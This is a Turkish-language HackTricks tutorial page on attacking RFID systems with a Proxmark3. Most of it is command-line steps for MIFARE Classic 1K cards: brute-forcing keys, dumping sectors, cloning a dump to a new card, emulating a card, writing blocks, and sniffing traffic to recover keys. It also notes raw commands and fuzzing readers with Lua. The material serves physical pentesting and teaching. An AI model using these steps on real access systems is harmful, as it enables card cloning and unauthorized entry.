# Proxmark 3

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaşın.**

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Proxmark3 ile RFID Sistemlerine Saldırı

İlk yapmanız gereken şey bir [**Proxmark3**](https://proxmark.com) sahibi olmak ve [**yazılımı ve bağımlılıklarını yüklemek**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**i**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB Saldırısı

Her birinde **4 blok** bulunan **16 sektörü** vardır ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
Her sektöre erişmek için **2 anahtar** (**A** ve **B**) gereklidir ve bunlar **her sektörün blok 3'ünde** (sektör kapakları) saklanır. Sektör kapakları ayrıca **her bloğa** erişim izinlerini veren **okuma ve yazma** izinlerini saklar.\
2 anahtar, ilkini bildiğinizde okuma izni vermek ve ikincisini bildiğinizde yazma izni vermek için kullanışlıdır (örneğin).

Birçok saldırı gerçekleştirilebilir.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3, hassas verileri bulmaya çalışmak için **Tag to Reader iletişimini dinleyerek** diğer eylemleri gerçekleştirmenize olanak tanır. Bu kartta, iletişimi dinleyebilir ve kullanılan anahtarı hesaplayabilirsiniz çünkü **kriptografik işlemler zayıftır** ve düz metin ve şifre metni bilindiğinde bunu hesaplayabilirsiniz (`mfkey64` aracı).

### Ham Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, Proxmark3'ü etiketlere özel **ham komutlar göndermek** için kullanabilirsiniz.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart hakkında bilgi aramayı ve kartla iletişim kurma yöntemini araştırmayı deneyebilirsiniz. Proxmark3, `hf 14a raw -p -b 7 26` gibi ham komutlar göndermenizi sağlar.

### Komut Dosyaları

Proxmark3 yazılımı, basit görevleri yerine getirmek için kullanabileceğiniz önceden yüklenmiş bir **otomasyon komut dosyaları** listesi ile birlikte gelir. Tam listeyi almak için `script list` komutunu kullanın. Daha sonra, script'in adını takip eden `script run` komutunu kullanın:
```
proxmark3> script run mfkeys
```
**Proxmark 3 ile Radyo Hacking**

Farklı bir **Lua betiği** oluşturabilirsiniz. Bu betik, **etiket okuyucularını fuzz** etmek için kullanılabilir. **Geçerli bir kartın** verilerini kopyalayarak, bir veya daha fazla **rastgele byte'ı randomize eden** ve herhangi bir iterasyonda **okuyucunun çöküp çökmediğini kontrol eden** bir Lua betiği yazın.

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>A'dan Z'ye AWS hackleme konusunda öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? Şirketinizi **HackTricks'te reklamını görmek ister misiniz**? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) görün
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile katkıda bulunun**.

</details>
